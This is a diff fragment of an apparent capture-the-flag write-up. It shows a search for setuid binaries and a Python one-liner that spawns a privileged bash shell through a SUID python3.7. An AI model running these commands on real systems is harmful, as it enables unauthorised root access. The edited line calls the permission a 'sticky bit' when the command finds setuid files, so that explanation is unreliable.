@@ -102,7 +102,7 @@ The current user is ```www-data```.  We need to find a way for privilege escalat
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-The output shows that ```python3.7``` is in stricty bit.  We try to privilege escalate it.
+The output shows that ```python3.7``` is in sticky bit.  We try to privilege escalate it using Python 3.
 
 ```bash
 python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
